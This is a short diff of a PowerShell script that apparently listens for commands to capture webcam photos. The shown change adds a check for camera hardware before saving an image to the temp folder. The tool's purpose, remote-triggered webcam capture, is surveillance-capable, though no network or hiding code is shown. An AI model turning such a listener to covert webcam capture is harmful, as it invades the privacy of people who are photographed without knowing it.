@@ -16,6 +16,12 @@ Write-Host "`n[+] Status: LISTENING for webcam capture commands...`n" -Foregroun
 
 # Function to capture photo from webcam using Windows API
 Function Capture-Webcam {
+    $cams = Get-CimInstance Win32_PnPEntity -Filter "PNPClass='Camera' or PNPClass='Image'" -ErrorAction SilentlyContinue
+    if (-not $cams) {
+        Write-Host "[-] No camera hardware detected on this PC." -ForegroundColor Yellow
+        return $null
+    }
+
     $tempFile = "$env:TEMP\webcam_capture_$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()).jpg"
     
     $code = @"
